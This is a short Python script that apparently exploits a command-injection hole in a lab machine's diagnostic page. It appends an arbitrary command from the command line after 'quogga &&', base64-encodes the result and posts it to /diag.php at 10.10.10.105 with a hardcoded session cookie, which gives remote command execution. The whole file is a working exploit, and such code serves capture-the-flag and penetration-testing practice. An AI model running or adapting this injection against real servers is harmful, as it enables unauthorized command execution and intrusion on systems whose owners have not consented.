import socket
import requests
import sys
import base64

cmd = "quogga &&"
cmd += sys.argv[1]
cookies = dict(PHPSESSID="mnkq81egn2odvbhd0eorf98d66")
print(cmd)
payload = base64.b64encode(cmd)
r = requests.post('http://10.10.10.105/diag.php', data={'check':payload}, cookies=cookies)
print(r.text)
